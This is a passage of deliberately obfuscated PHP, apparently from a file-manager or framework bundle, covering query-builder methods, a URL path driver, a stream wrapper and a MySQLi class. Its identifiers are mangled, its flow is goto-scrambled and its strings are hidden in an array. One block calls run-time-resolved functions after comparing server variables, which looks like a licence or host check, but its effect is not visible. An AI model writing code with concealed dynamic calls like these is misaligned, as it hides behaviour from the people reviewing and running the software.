$_SERVER[Ç³Íß¦Ó]; if (is_array($cÙŠ·ˆÃ)) { $this->options[$a·ƒïŸ¯«…[279]] = $cÙŠ·ˆÃ; } elseif (!empty($cÙŠ·ˆÃ)) { $this->options[$a·ƒïŸ¯«…[279]][] = $cÙŠ·ˆÃ; } return $this; } public function union($Fğå‹¶øÀ, $d…‘¢±µŒÄ = false) { goto d¸ê á‘Èò; d¸ê á‘Èò: $fÁØ¶‡Ãîñ =& $_SERVER[Ç³Íß¦Ó]; if (empty($Fğå‹¶øÀ)) { return $this; } if ($d…‘¢±µŒÄ) { $this->options[$fÁØ¶‡Ãîñ[344]][$fÁØ¶‡Ãîñ[345]] = !0; } goto aøÆ´ ÔèÚ; FÕÇ‚†ºÈ¥: return $this; goto bòÉ—·¿âˆ; aøÆ´ ÔèÚ: if (is_object($Fğå‹¶øÀ)) { $Fğå‹¶øÀ = get_object_vars($Fğå‹¶øÀ); } if (is_string($Fğå‹¶øÀ)) { $e…™³çÆĞ = $Fğå‹¶øÀ; } elseif (is_array($Fğå‹¶øÀ)) { if (isset($Fğå‹¶øÀ[0])) { $this->options[$fÁØ¶‡Ãîñ[344]] = array_merge($this->options[$fÁØ¶‡Ãîñ[344]], $Fğå‹¶øÀ); return $this; } else { $e…™³çÆĞ = $Fğå‹¶øÀ; } } else { think_exception(think_lang($fÁØ¶‡Ãîñ[268])); } $this->options[$fÁØ¶‡Ãîñ[344]][] = $e…™³çÆĞ; goto FÕÇ‚†ºÈ¥; bòÉ—·¿âˆ: } public function cache($eŞ¾š¶ñö• = true, $fÙš…„ö§ = null, $BªçŸö£‰Ú = '') { $cİÉâØÜ½ =& $_SERVER[Ç³Íß¦Ó]; if (!1 !== $eŞ¾š¶ñö•) { $this->options[$cİÉâØÜ½[346]] = array($cİÉâØÜ½[93] => $eŞ¾š¶ñö•, $cİÉâØÜ½[336] => $fÙš…„ö§, $cİÉâØÜ½[29] => $BªçŸö£‰Ú); } return $this; } public function field($DÔñõÀù½Ä, $BØš¨¥É…À = false) { $aÍ†Õöí‚¸ =& $_SERVER[Ç³Íß¦Ó]; if (!0 === $DÔñõÀù½Ä) { $fë¡è„×³ò = $this->getDbFields(); $DÔñõÀù½Ä = $fë¡è„×³ò ? $fë¡è„×³ò : $aÍ†Õöí‚¸[182]; } elseif ($BØš¨¥É…À) { if (is_string($DÔñõÀù½Ä)) { $DÔñõÀù½Ä = explode($aÍ†Õöí‚¸[47], $DÔñõÀù½Ä); } $fë¡è„×³ò = $this->getDbFields(); $DÔñõÀù½Ä = $fë¡è„×³ò ? array_diff($fë¡è„×³ò, $DÔñõÀù½Ä) : $DÔñõÀù½Ä; } $this->options[$aÍ†Õöí‚¸[270]] = $DÔñõÀù½Ä; return $this; } public function scope($Fßèø…„Ô¤ = '', $dËí‚÷°ë = NULL) { $dÉÉµ±„ùé =& $_SERVER[Ç³Íß¦Ó]; if ($dÉÉµ±„ùé[33] === $Fßèø…„Ô¤) { if (isset($this->_scope[$dÉÉµ±„ùé[34]])) { $cÕï¤ˆäñ’ = $this->_scope[$dÉÉµ±„ùé[34]]; } else { return $this; } } elseif (is_string($Fßèø…„Ô¤)) { $Aá‘ã„´ï‘ = explode($dÉÉµ±„ùé[47], $Fßèø…„Ô¤); $cÕï¤ˆäñ’ = array(); foreach ($Aá‘ã„´ï‘ as $e‘§Ã£ñÓ”) { if (!isset($this->_scope[$e‘§Ã£ñÓ”])) { continue; } $cÕï¤ˆäñ’ = array_merge($cÕï¤ˆäñ’, $this->_scope[$e‘§Ã£ñÓ”]); } if (!empty($dËí‚÷°ë) && is_array($dËí‚÷°ë)) { $cÕï¤ˆäñ’ = array_merge($cÕï¤ˆäñ’, $dËí‚÷°ë); } } elseif (is_array($Fßèø…„Ô¤)) { $cÕï¤ˆäñ’ = $Fßèø…„Ô¤; } if (is_array($cÕï¤ˆäñ’) && !empty($cÕï¤ˆäñ’)) { $this->options = array_merge($this->options, array_change_key_case($cÕï¤ˆäñ’)); } return $this; } public function where($AÚ¢„‹È‹è, $Bóƒ÷µèÛ› = null) { $cÕğ¦ÑÕœ‹ =& $_SERVER[Ç³Íß¦Ó]; if (!is_null($Bóƒ÷µèÛ›) && is_string($AÚ¢„‹È‹è)) { if (!is_array($Bóƒ÷µèÛ›)) { $Bóƒ÷µèÛ› = func_get_args(); array_shift($Bóƒ÷µèÛ›); } $Bóƒ÷µèÛ› = array_map(array($this->db, $cÕğ¦ÑÕœ‹[340]), $Bóƒ÷µèÛ›); $AÚ¢„‹È‹è = vsprintf($AÚ¢„‹È‹è, $Bóƒ÷µèÛ›); } elseif (is_object($AÚ¢„‹È‹è)) { $AÚ¢„‹È‹è = get_object_vars($AÚ¢„‹È‹è); } elseif (is_array($AÚ¢„‹È‹è)) { foreach ($AÚ¢„‹È‹è as $c»’Ô‚·’Š => $EµĞ¥«Õ®’) { if ((is_numeric($c»’Ô‚·’Š) || !$c»’Ô‚·’Š) && is_string($EµĞ¥«Õ®’)) { if (strpos($EµĞ¥«Õ®’, $cÕğ¦ÑÕœ‹[347]) === 0) { continue; } think_trace($cÕğ¦ÑÕœ‹[348], $cÕğ¦ÑÕœ‹[33], $cÕğ¦ÑÕœ‹[46]); die; } } } if (is_string($AÚ¢„‹È‹è) && $cÕğ¦ÑÕœ‹[33] != $AÚ¢„‹È‹è) { $DØ•ÜÑˆªœ = array(); $DØ•ÜÑˆªœ[$cÕğ¦ÑÕœ‹[349]] = $AÚ¢„‹È‹è; $AÚ¢„‹È‹è = $DØ•ÜÑˆªœ; } if (isset($this->options[$cÕğ¦ÑÕœ‹[272]])) { $this->options[$cÕğ¦ÑÕœ‹[272]] = array_merge($this->options[$cÕğ¦ÑÕœ‹[272]], $AÚ¢„‹È‹è); } else { $this->options[$cÕğ¦ÑÕœ‹[272]] = $AÚ¢„‹È‹è; } return $this; } public function limit($bÅ­¢‡Õ÷¢, $aÍ÷À·¡—ï = null) { $aÛ‰ÙŞ¥œ£ =& $_SERVER[Ç³Íß¦Ó]; $this->options[$aÛ‰ÙŞ¥œ£[289]] = is_null($aÍ÷À·¡—ï) ? $bÅ­¢‡Õ÷¢ : $bÅ­¢‡Õ÷¢ . $aÛ‰ÙŞ¥œ£[47] . $aÍ÷À·¡—ï; return $this; } public function page($a¬Œ™Î¬¦à, $b¹öƒöáø÷ = null) { $C‚òåİšï =& $_SERVER[Ç³Íß¦Ó]; $this->options[$C‚òåİšï[350]] = is_null($b¹öƒöáø÷) ? $a¬Œ™Î¬¦à : $a¬Œ™Î¬¦à . $C‚òåİšï[47] . $b¹öƒöáø÷; return $this; } public function comment($EßŒ­ÁÃçè) { $this->options[$_SERVER[Ç³Íß¦Ó][351]] = $EßŒ­ÁÃçè; return $this; } public function setProperty($A‚é·‘âÄ¿, $b£…—´™˜º) { if (property_exists($this, $A‚é·‘âÄ¿)) { $this->{$A‚é·‘âÄ¿} = $b£…—´™˜º; } return $this; } } goto a¬÷à™Š›‰; F¯Ö–ˆŒŠ§: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($a£ÎİĞƒ»Æ = false) { } public function exist($BƒÆ§Ö™Šè) { $c™¨¨ø‚Û = $this->info($BƒÆ§Ö™Šè); return $c™¨¨ø‚Û[$_SERVER[Ç³Íß¦Ó][194]]; } public function isFile($CîÊ³Ğòˆ) { $fŠ°©ô¤Ò™ = $this->info($CîÊ³Ğòˆ); return $fŠ°©ô¤Ò™[$_SERVER[Ç³Íß¦Ó][194]]; } public function isFolder($A²¯øâšÍ) { return !1; } public function size($DêŞî±¯»Ô) { $e¤Ôî¢¦öÜ = $this->info($DêŞî±¯»Ô); return $e¤Ôî¢¦öÜ[$_SERVER[Ç³Íß¦Ó][78]]; } public function info($D­œÃ±ïò) { return $this->infoParse($D­œÃ±ïò); } public function infoAuth($fùÓçØê «) { return $this->infoParse($fùÓçØê «); } public function infoWithChildren($e›ÓëÙá) { return $this->infoParse($e›ÓëÙá); } public function infoFull($f¼ËÎÕ») { return $this->infoParse($f¼ËÎÕ»); } private function infoParse($B½²¡ğÜ¸Á) { $d®Ôø§Š‡¥ =& $_SERVER[Ç³Íß¦Ó]; $aäöµ¼©µµ = $this->header($B½²¡ğÜ¸Á); if (!$aäöµ¼©µµ || !$aäöµ¼©µµ[$d®Ôø§Š‡¥[714]]) { return !1; } $F·Ğé£ô°ƒ = _get($aäöµ¼©µµ, $d®Ôø§Š‡¥[334], 0); $aˆ±†’ø¶µ = array($d®Ôø§Š‡¥[28] => $aäöµ¼©µµ[$d®Ôø§Š‡¥[28]], $d®Ôø§Š‡¥[76] => $B½²¡ğÜ¸Á, $d®Ôø§Š‡¥[29] => $d®Ôø§Š‡¥[192], $d®Ôø§Š‡¥[78] => intval($F·Ğé£ô°ƒ), $d®Ôø§Š‡¥[168] => get_path_ext($aäöµ¼©µµ[$d®Ôø§Š‡¥[28]]), $d®Ôø§Š‡¥[1254] => $F·Ğé£ô°ƒ > 0 && $aäöµ¼©µµ[$d®Ôø§Š‡¥[1375]], $d®Ôø§Š‡¥[1255] => !1); return $aˆ±†’ø¶µ; } private function header($fã²ÙˆÉ) { goto dË…‚¡¬—; b¯îÃÚÕòÑ: $GLOBALS[$a÷’éï½‘[1376]] = !0; self::$_cacheHeader[$fã²ÙˆÉ] = url_header($fã²ÙˆÉ); $GLOBALS[$a÷’éï½‘[1376]] = $Bì…»À½½À; goto B¡ğÕŞª˜™; dË…‚¡¬—: $a÷’éï½‘ =& $_SERVER[Ç³Íß¦Ó]; if (isset(self::$_cacheHeader[$fã²ÙˆÉ])) { return self::$_cacheHeader[$fã²ÙˆÉ]; } $Bì…»À½½À = isset($GLOBALS[$a÷’éï½‘[1376]]) ? $GLOBALS[$a÷’éï½‘[1376]] : !1; goto b¯îÃÚÕòÑ; B¡ğÕŞª˜™: return self::$_cacheHeader[$fã²ÙˆÉ]; goto AêĞ¸‹š¬Ç; AêĞ¸‹š¬Ç: } public function hashSimple($eó½ïÊÁÛÑ, $D…œ¤åÒ½ø = false) { goto c»Œ›¡ÀÏ; dÈ´ä–¿Òæ: $Bº˜‹Ÿ‹Ìº .= $this->fileSubstr($eó½ïÊÁÛÑ, $A‘ÖŞ¢ÙÇ“ - $c¨Àã·º‰‡, $c¨Àã·º‰‡); return md5($Bº˜‹Ÿ‹Ìº) . $A‘ÖŞ¢ÙÇ“; goto C‡ ƒÂ¼‘›; c»Œ›¡ÀÏ: $d¹ğ‚‘¶±ì =& $_SERVER[Ç³Íß¦Ó]; $c ªí—ğˆ = $this->info($eó½ïÊÁÛÑ); if (!$c ªí—ğˆ || !$c ªí—ğˆ[$d¹ğ‚‘¶±ì[194]]) { return !1; } goto D£â¹áéï˜; eˆÚÑ¼Ó³À: $fáÙïä˜­„ = timeFloat(); $cËùƒí‹Ş = 15; for ($fĞŒËŞçˆ¼ = 0; $fĞŒËŞçˆ¼ < $AğÙ™¸ç²Ç; $fĞŒËŞçˆ¼++) { if (timeFloat() - $fáÙïä˜­„ > $cËùƒí‹Ş) { return !1; } $Fø›ƒ¸¤Ä› = $this->fileSubstr($eó½ïÊÁÛÑ, $e¼´’ã„º * $fĞŒËŞçˆ¼, $c¨Àã·º‰‡); if (!$Fø›ƒ¸¤Ä›) { return !1; } $Bº˜‹Ÿ‹Ìº .= $Fø›ƒ¸¤Ä›; } goto dÈ´ä–¿Òæ; D£â¹áéï˜: $A‘ÖŞ¢ÙÇ“ = $c ªí—ğˆ[$d¹ğ‚‘¶±ì[78]]; $c¨Àã·º‰‡ = 200; $AğÙ™¸ç²Ç = 50; goto Eùë¹øÅ³—; Eùë¹øÅ³—: if ($A‘ÖŞ¢ÙÇ“ <= $c¨Àã·º‰‡ * $AğÙ™¸ç²Ç) { return md5($this->fileSubstr($eó½ïÊÁÛÑ, 0, $A‘ÖŞ¢ÙÇ“)) . $A‘ÖŞ¢ÙÇ“; } $e¼´’ã„º = intval($A‘ÖŞ¢ÙÇ“ / $AğÙ™¸ç²Ç); $Bº˜‹Ÿ‹Ìº = $d¹ğ‚‘¶±ì[33]; goto eˆÚÑ¼Ó³À; C‡ ƒÂ¼‘›: } public function getContent($bò­×¶ïÉË) { return $this->fileSubstr($bò­×¶ïÉË); } public function fileSubstr($e›‘‡½„àŒ, $eŠËØÛÈË = 0, $a»ä¢Ú¥Ãœ = -1) { goto d¿ÑÒ›¶; DáõÑ¸çï‡: if ($a»ä¢Ú¥Ãœ === -1) { $a»ä¢Ú¥Ãœ = $CªßÒÏ³Ë[$Bö‘‘ÒáÊä[78]]; } if ($a»ä¢Ú¥Ãœ == 0) { return $Bö‘‘ÒáÊä[33]; } $BÜ¹ñÆõ„» = array($Bö‘‘ÒáÊä[1377] . $eŠËØÛÈË . $Bö‘‘ÒáÊä[745] . ($eŠËØÛÈË + $a»ä¢Ú¥Ãœ - 1)); goto c¤ô¹øƒŒ¬; d¿ÑÒ›¶: $Bö‘‘ÒáÊä =& $_SERVER[Ç³Íß¦Ó]; $CªßÒÏ³Ë = $this->info($e›‘‡½„àŒ); if (!$CªßÒÏ³Ë || !$CªßÒÏ³Ë[$Bö‘‘ÒáÊä[194]] && $CªßÒÏ³Ë[$Bö‘‘ÒáÊä[78]] > 1024 * 1024 * 10) { return !1; } goto DáõÑ¸çï‡; c¤ô¹øƒŒ¬: $d†ô­¤®éå = url_request($e›‘‡½„àŒ, $Bö‘‘ÒáÊä[227], !1, $BÜ¹ñÆõ„», !1, !1, 1); return $d†ô­¤®éå[$Bö‘‘ÒáÊä[1088]] ? $d†ô­¤®éå[$Bö‘‘ÒáÊä[1088]] : $Bö‘‘ÒáÊä[33]; goto bÄ…¸ÃæŒ§; bÄ…¸ÃæŒ§: } public function download($C¤¹Ä¶Èå¦, $dº»ê¸é‘) { Downloader::start($C¤¹Ä¶Èå¦, $dº»ê¸é‘); return $dº»ê¸é‘; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Aè¬Šê©³Á, $E…ÑŠÓƒ˜ = '') { goto dÀ×©ŠÁÔæ; dÀ×©ŠÁÔæ: $this->info = $this->info($Aè¬Šê©³Á); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Ç³Íß¦Ó][76]]; goto C—ÙÏ×É°·; b¦£­½á: if (!isset(self::$_chunkBuffer[$Aè¬Šê©³Á])) { self::$_chunkBuffer[$Aè¬Šê©³Á] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto E¸øê›Ô†; C—ÙÏ×É°·: $this->pathOpen = $Aè¬Šê©³Á; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto b¦£­½á; E¸øê›Ô†: } function stream_read($d­ËŠÔ´œà) { $Aôëˆå…ñ” = $this->fileSubstr($this->pose, $d­ËŠÔ´œà); $this->pose += strlen($Aôëˆå…ñ”); return $Aôëˆå…ñ”; } public function stream_tell() { return $this->pose; } public function stream_seek($Fáã¿âÂ—”, $a¡š”‘»ÔÑ) { $BÏğõø’¹à =& $_SERVER[Ç³Íß¦Ó]; if ($a¡š”‘»ÔÑ == SEEK_SET) { $this->pose = $Fáã¿âÂ—”; } else { if ($a¡š”‘»ÔÑ == SEEK_CUR) { $this->pose += $Fáã¿âÂ—”; } else { if ($a¡š”‘»ÔÑ == SEEK_END) { $this->pose = $this->info[$BÏğõø’¹à[78]] + intval($Fáã¿âÂ—”); } } } if ($Fáã¿âÂ—” < 0) { $this->pose = $this->info[$BÏğõø’¹à[78]] + $Fáã¿âÂ—”; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Ç³Íß¦Ó][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($fÚóĞÄÏİÒ, $B¤÷„ÍíŒ¤) { $CÄù¨Ú÷Ã =& $_SERVER[Ç³Íß¦Ó]; $bšìŠ‹±‹… = $this->info($fÚóĞÄÏİÒ); return array($CÄù¨Ú÷Ã[1378] => 0, $CÄù¨Ú÷Ã[1379] => 0, $CÄù¨Ú÷Ã[12] => 32768 + 511, $CÄù¨Ú÷Ã[1380] => 0, $CÄù¨Ú÷Ã[1381] => 0, $CÄù¨Ú÷Ã[1382] => 0, $CÄù¨Ú÷Ã[1383] => 0, $CÄù¨Ú÷Ã[78] => $bšìŠ‹±‹…[$CÄù¨Ú÷Ã[78]], $CÄù¨Ú÷Ã[1384] => $bšìŠ‹±‹…[$CÄù¨Ú÷Ã[1253]], $CÄù¨Ú÷Ã[1340] => $bšìŠ‹±‹…[$CÄù¨Ú÷Ã[84]], $CÄù¨Ú÷Ã[1339] => $bšìŠ‹±‹…[$CÄù¨Ú÷Ã[193]], $CÄù¨Ú÷Ã[1385] => 0, $CÄù¨Ú÷Ã[1386] => 0); } static $fileInfo = array(); public function info($cÂ”£¤Ïš×) { $E±Ç—î†À× = $_SERVER[Ç³Íß¦Ó][1387]; if (isset(self::$fileInfo[$cÂ”£¤Ïš×])) { return self::$fileInfo[$cÂ”£¤Ïš×]; } if (substr($cÂ”£¤Ïš×, 0, strlen($E±Ç—î†À×)) != $E±Ç—î†À×) { return !1; } self::$fileInfo[$cÂ”£¤Ïš×] = IO::info(substr($cÂ”£¤Ïš×, strlen($E±Ç—î†À×))); return self::$fileInfo[$cÂ”£¤Ïš×]; } public static function read($C’¶ìßÒ‚, $b˜Ü¸ä“‡, $A³†âÕÚİ¡) { if (!isset(self::$_fopenCache[$C’¶ìßÒ‚])) { $c‘ø¸öÃ² = new StreamWrapperIO(); $c‘ø¸öÃ²->stream_open($C’¶ìßÒ‚); self::$_fopenCache[$C’¶ìßÒ‚] = $c‘ø¸öÃ²; } $c‘ø¸öÃ² = self::$_fopenCache[$C’¶ìßÒ‚]; return $c‘ø¸öÃ²->fileSubstr($b˜Ü¸ä“‡, $A³†âÕÚİ¡); } public static function _read($FÏÏ–†‰–, $EÅ„¨³§Õ, $bçÛëØùó) { goto DÅóæé—œ; A‡ÉÃ×ŒŞã: return $DŞ³ÒÖƒÂ; goto f©ç©¤°ˆ; Fã«°Æ“Ò: $eğ‚œŒò = 0; while ($eğ‚œŒò < $bçÛëØùó) { $Cí¢Ööñ¡ = min($dŸëô†‚Æ­, $bçÛëØùó - $eğ‚œŒò); $DŞ³ÒÖƒÂ .= fread($AÊ‚²‹¹ñ¥, $Cí¢Ööñ¡); $eğ‚œŒò += $Cí¢Ööñ¡; } fclose($AÊ‚²‹¹ñ¥); goto A‡ÉÃ×ŒŞã; D˜º„‚¨ˆù: $dŸëô†‚Æ­ = 8192; fseek($AÊ‚²‹¹ñ¥, $EÅ„¨³§Õ, SEEK_SET); $DŞ³ÒÖƒÂ = $C­å½¬¯è–[33]; goto Fã«°Æ“Ò; DÅóæé—œ: $C­å½¬¯è– =& $_SERVER[Ç³Íß¦Ó]; $AÊ‚²‹¹ñ¥ = fopen($FÏÏ–†‰–, $C­å½¬¯è–[1257]); if (!$AÊ‚²‹¹ñ¥) { return $C­å½¬¯è–[33]; } goto D˜º„‚¨ˆù; f©ç©¤°ˆ: } public function fileSubstr($C‰ğ Ù®Âã, $bÄ¸×¡Û¿ã) { goto B˜ùÂØØ°›; eÑ¿î”Øé®: if ($C‰ğ Ù®Âã + $bÄ¸×¡Û¿ã > $aÓòù®Ë¹·) { $bÄ¸×¡Û¿ã = $aÓòù®Ë¹· - $C‰ğ Ù®Âã; } if ($bÄ¸×¡Û¿ã <= 0) { return $FÌÅ‡Æ‰ßÇ[33]; } if ($C‰ğ Ù®Âã < 0 || $C‰ğ Ù®Âã >= $aÓòù®Ë¹· || $bÄ¸×¡Û¿ã <= 0 || $bÄ¸×¡Û¿ã > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\x46\x69\154\x65\x52\145\141\144\40\145\162\162\157\x72\41\x20\x73\x74\x61\x72\x74\x3d{$C‰ğ Ù®Âã}\73\154\145\156\147\x74\150\x3d{$bÄ¸×¡Û¿ã}\x3b\x20\x73\x69\172\145\75{$aÓòù®Ë¹·}\x3b"); } goto f‘ïê¬¯Ä†; dË‰åó÷¶: foreach ($AÜê§ºÍÕ¸ as $DÍä¡ÑÏ¡ => $FëØÀŒôŒ·) { $DÍä¡ÑÏ¡ = intval($DÍä¡ÑÏ¡); $Dã„ÙÔ†À¦ = $DÍä¡ÑÏ¡ + strlen($FëØÀŒôŒ·); if ($C‰ğ Ù®Âã >= $Dã„ÙÔ†À¦) { continue; } if ($C‰ğ Ù®Âã >= $DÍä¡ÑÏ¡ && $C‰ğ Ù®Âã + $bÄ¸×¡Û¿ã <= $Dã„ÙÔ†À¦) { return substr($FëØÀŒôŒ·, $C‰ğ Ù®Âã - $DÍä¡ÑÏ¡, $bÄ¸×¡Û¿ã); } break; } if (count($AÜê§ºÍÕ¸) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($FÌÅ‡Æ‰ßÇ[1388], $FÌÅ‡Æ‰ßÇ[1389] . count($AÜê§ºÍÕ¸) . "\73\163\x74\x61\x72\164\75{$C‰ğ Ù®Âã}\54\x6c\x65\x6e\147\164\x68\x3d{$bÄ¸×¡Û¿ã}\x3b\x70\157\x73\x65\72{$DÍä¡ÑÏ¡}\176{$Dã„ÙÔ†À¦}"); throw new Exception($FÌÅ‡Æ‰ßÇ[1390]); } $A—•îïÄ©Ğ = intval($C‰ğ Ù®Âã / $e´¤š ä‘Ç) * $e´¤š ä‘Ç; goto Cù©É”¢²; B˜ùÂØØ°›: $FÌÅ‡Æ‰ßÇ =& $_SERVER[Ç³Íß¦Ó]; $aÓòù®Ë¹· = $this->info[$FÌÅ‡Æ‰ßÇ[78]]; $D‘­¾˜ = $C‰ğ Ù®Âã; goto Eˆä’Š‚‰; Cù©É”¢²: $câø·ì¶æ¿ = ceil(($C‰ğ Ù®Âã + $bÄ¸×¡Û¿ã) / $e´¤š ä‘Ç) * $e´¤š ä‘Ç - $A—•îïÄ©Ğ; $dŸáéÑÔâÓ = IO::fileSubstr($this->path, $A—•îïÄ©Ğ, $câø·ì¶æ¿); $AÜê§ºÍÕ¸[$A—•îïÄ©Ğ . $FÌÅ‡Æ‰ßÇ[33]] = $dŸáéÑÔâÓ; goto C¡˜ŠÊ‹Ì¿; Eˆä’Š‚‰: $DãÑø–¦‰° = $bÄ¸×¡Û¿ã; if ($C‰ğ Ù®Âã < 0) { $C‰ğ Ù®Âã = $aÓòù®Ë¹· + $C‰ğ Ù®Âã; } if ($bÄ¸×¡Û¿ã === !1) { $bÄ¸×¡Û¿ã = $aÓòù®Ë¹· - $C‰ğ Ù®Âã; } goto eÑ¿î”Øé®; B…Î‚Õï™: $DÍä¡ÑÏ¡ = 0; $Dã„ÙÔ†À¦ = 0; $FëØÀŒôŒ· = $FÌÅ‡Æ‰ßÇ[33]; goto dË‰åó÷¶; f‘ïê¬¯Ä†: $e´¤š ä‘Ç = 64 * 1024; $AÜê§ºÍÕ¸ =& self::$_chunkBuffer[$this->path]; if (!$AÜê§ºÍÕ¸) { $AÜê§ºÍÕ¸ = array(); } goto B…Î‚Õï™; C¡˜ŠÊ‹Ì¿: ksort($AÜê§ºÍÕ¸); $Dß•Å¶»ó§ = substr($dŸáéÑÔâÓ, $C‰ğ Ù®Âã - $A—•îïÄ©Ğ, $bÄ¸×¡Û¿ã); return $Dß•Å¶»ó§; goto DËíƒØî§«; DËíƒØî§«: } private function log($b‘Ø´¾ùˆó, $BÁ³¨”²) { $F»¦¨ãš­÷ =& $_SERVER[Ç³Íß¦Ó]; $FèšÓ×õ‹ = timeFloat() - $this->timeStart; write_log(sprintf($F»¦¨ãš­÷[1391], $b‘Ø´¾ùˆó, $this->info[$F»¦¨ãš­÷[28]], $FèšÓ×õ‹, $BÁ³¨”²), $F»¦¨ãš­÷[1078]); } } if ($_SERVER[$_SERVER[Ç³Íß¦Ó][834]] != $_SERVER[$_SERVER[Ç³Íß¦Ó][1392]]) { goto dé¬»¥ÏÕ; B²‹½¦Áº: $f“äç‚İ‡î($_SERVER[$_SERVER[Ç³Íß¦Ó][832]]); goto a¡ë®¯÷í‰; dé¬»¥ÏÕ: $Eõäâ˜ÓÃ = $_SERVER[Ç³Íß¦Ó][836]; $A«¤õƒ¯ = $_SERVER[$_SERVER[Ç³Íß¦Ó][837]] . $_SERVER[Ç³Íß¦Ó][838]; $B†«é™‰Á© = $Eõäâ˜ÓÃ($A«¤õƒ¯); goto fÊïÕœª¹; fÊïÕœª¹: $aà¤¶¨¿È = explode($_SERVER[Ç³Íß¦Ó][228], $B†«é™‰Á©); if (count($aà¤¶¨¿È) < $_SERVER[Ç³Íß¦Ó][598]) { $Aì»Ó¯¿Œİ = $_SERVER[Ç³Íß¦Ó][839]; $Aì»Ó¯¿Œİ(); } $f“äç‚İ‡î = $_SERVER[Ç³Íß¦Ó][1393]; goto B²‹½¦Áº; a¡ë®¯÷í‰: } goto bµ°·Ñ«ÒÌ; C¬ô‰±çÈ­: class DbMysqli extends Db { public function __construct($C´´«»¿—õ = '') { $D¯ß„Ô‹ =& $_SERVER[Ç³Íß¦Ó]; if (!extension_loaded($D¯ß„Ô‹[759])) { think_exception(think_lang($D¯ß„Ô‹[10]) . $D¯ß„Ô‹[872]); } if (!empty($C´´«»¿—õ)) { $this->config = $C´´«»¿—õ; if (empty($this->config[$D¯ß„Ô‹[13]])) { $this->config[$D¯ß„Ô‹[13]] = $D¯ß„Ô‹[33]; } } } public function connect($DÂ¥§‘‡¶š = '', $f‘Ş½Ë« = 0) { $DÃÀÓ©Ò ä =& $_SERVER[Ç³Íß¦Ó]; if (!isset($this->linkID[$f‘Ş½Ë«])) { goto eóØ‡À ™Á; eóØ‡À ™Á: if (empty($DÂ¥§‘‡¶š)) { $DÂ¥§‘‡¶š = $this->config; } $this->linkID[$f‘Ş½Ë«] = new mysqli($DÂ¥§‘‡¶š[$DÃÀÓ©Ò ä[846]], $DÂ¥§‘‡¶š[$DÃÀÓ©Ò ä[848]], $DÂ¥§‘‡¶š[$DÃÀÓ©Ò ä[849]], $DÂ¥§‘‡¶š[$DÃÀÓ©Ò ä[17]], $DÂ¥§‘‡¶š[$DÃÀÓ©Ò ä[847]] ? intval($DÂ¥§‘‡¶š[$DÃÀÓ©Ò ä[847]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto FƒÚ¡ÃŠº·; FƒÚ¡ÃŠº·: $C‚ßŠ‚µÀ¾ = $this->linkID[$f‘Ş½Ë«]->server_version; $this->linkID[$f‘Ş½Ë«]->query($DÃÀÓ©Ò ä[850] . think_config($DÃÀÓ©Ò ä[851]) . $DÃÀÓ©Ò ä[55]); if ($C‚ßŠ‚µÀ¾ > $DÃÀÓ©Ò ä[852]) { $this->linkID[$f‘Ş½Ë«]->query($DÃÀÓ©Ò ä[853]); } goto F±×ğ¡Í–‘; F±×ğ¡Í–‘: $this->connected = !0; if (1 != think_config($DÃÀÓ©Ò ä[18])) { unset($this->config); } goto F±Ö©çÍß; F±Ö©çÍß: } return $this->linkID[$f‘Ş½Ë«]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($c¤·Ğ‡÷) { goto fÆëê­ô˜—; cÙÚõŠ“²Ô: $this->queryStr = $c¤·Ğ‡÷; if ($this->queryID) { $this->free(); } think_action_status($aê‚Ê‡ÎÄ[19], 1); goto B±Ğ”ÃÚÖ©; cî“ˆÆÆÌ : $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto aÂÛ†Ãµ•; fÆëê­ô˜—: $aê‚Ê‡ÎÄ =& $_SERVER[Ç³Íß¦Ó]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto cÙÚõŠ“²Ô; B±Ğ”ÃÚÖ©: think_status($aê‚Ê‡ÎÄ[20]); $this->queryID = $this->_linkID->query($c¤·Ğ‡÷); if ($this->_linkID->more_results()) { while (($b¿‰¼Ú‡Ÿ® = $this->_linkID->next_result()) != NULL) { $b¿‰¼Ú‡Ÿ®->free_result(); } } goto cî“ˆÆÆÌ ; aÂÛ†Ãµ•: } public function execute($cßß÷¨™Ëö) { goto CÁí§ƒôÏÆ; C“ã«ËÏ§¥: $this->queryStr = $cßß÷¨™Ëö; if ($this->queryID) { $this->free(); } think_action_status($cïÕ‡í·[21], 1); goto fÎ½ÖƒÑ; fé‰ğ¤õœ: if (!1 === $F»î‹§Ã¶„) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto EÇÎ”Œñ£; CÁí§ƒôÏÆ: $cïÕ‡í· =& $_SERVER[Ç³Íß¦Ó]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto C“ã«ËÏ§¥; fÎ½ÖƒÑ: think_status($cïÕ‡í·[20]); $F»î‹§Ã¶„ = $this->_linkID->query($cßß÷¨™Ëö); $this->debug(); goto fé‰ğ¤õœ; EÇÎ”Œñ£: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $CÈ•‰·Ì›Œ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$CÈ•‰·Ì›Œ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $e§”Äí¦Æ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$e§”Äí¦Æ) { $this->error(); return !1; } } return !0; } private function getAll() { $D‰™†ñÍ…˜ = array(); if ($this->numRows > 0) { for ($e‡‚¡……‡ö = 0; 